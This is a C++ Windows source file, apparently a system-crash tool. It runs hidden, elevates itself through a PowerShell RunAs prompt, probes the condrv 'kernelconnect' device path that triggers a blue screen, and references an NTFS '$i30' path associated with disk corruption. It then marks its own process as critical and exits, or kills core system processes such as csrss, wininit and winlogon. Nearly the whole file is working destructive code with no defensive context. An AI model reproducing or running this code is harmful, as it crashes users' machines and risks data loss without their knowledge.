#include <iostream>
#include<Windows.h>
#include "../../resource/tool.h"

#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

constexpr const wchar_t* bsod_path = L"\\\\.\\globalroot\\device\\condrv\\kernelconnect";
constexpr const wchar_t* chkdsk_path = L"\\\\?\\C:\\:$i30:$bitmap";

int main(int argc,char* argv[]){
	if (argc > 1 && 0 == strcmp(argv[1], "-kernelconnect")) {
		WIN32_FILE_ATTRIBUTE_DATA data;
		if (::GetFileAttributesExW(bsod_path, GetFileExInfoStandard, &data)) return 0;
		return 1;
		return 0;
	}
	if (!IsRunAsAdmin()) {
		Process.StartOnly_HiddenWindow(s2ws("\""s + GetProgramDir() + "\" -kernelconnect"));
		auto pi = Process.Start_HiddenWindow(s2ws("PowerShell Start-Process -FilePath \""s +
			GetProgramDir() + "\" -ArgumentList '-RunAs' -Verb RunAs"));
		if (!pi.hProcess) {
			cerr << "Cannot Create Process!\n"; return 1;
		}
		::WaitForSingleObject(pi.hProcess, MAXDWORD);
		DWORD exitCode = 1;
		::GetExitCodeProcess(pi.hProcess, &exitCode);
		Process.CloseProcessHandle(pi);
		return exitCode;
	}
	if (argc > 1 && 0 == strcmp(argv[1], "-chkdsk")) {
		WIN32_FILE_ATTRIBUTE_DATA data;
		if (!::GetFileAttributesExW(chkdsk_path, GetFileExInfoStandard, &data)) return 1;
		return 0;
	}
	if (argc > 1 && 0 == strcmp(argv[1], "-core")) {
		debugger;
		if (!EnableDebugPrivilege()) {
			cerr << "Error while EnableDebugPrivilege\n";
			return 1;
		}
		ULONG F = 1;
		Process.NtSetInformationProcess(GetCurrentProcess(), 
			Process_t::ProcessBreakOnTermination, &F, sizeof(ULONG));
		return 233;
	}
	PROCESS_INFORMATION pi; AutoZeroMemory(pi);
	STARTUPINFOA si; AutoZeroMemory(si);
	si.cb = sizeof si; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
	if (!::CreateProcessA(NULL, (LPSTR)("\"" + ::GetProgramDir() + "\" -core").c_str(), 
		NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		cerr << "Cannot Create Process!\n";
		Process.CloseProcessHandle(pi);
		return 1;
	}
	::CloseHandle(pi.hThread);
	::WaitForSingleObject(pi.hProcess, MAXDWORD);
	DWORD exitCode = 1;
	::GetExitCodeProcess(pi.hProcess, &exitCode);
	::CloseHandle(pi.hProcess);
	if (exitCode == 0) return 0;
	Process.killall(L"explorer.exe");
	Process.killall(L"csrss.exe");
	Process.killall(L"wininit.exe");
	Process.killall(L"services.exe");
	Process.killall(L"winlogon.exe");
	Process.killall(L"svchost.exe");
	return 1;
	return 0;
}
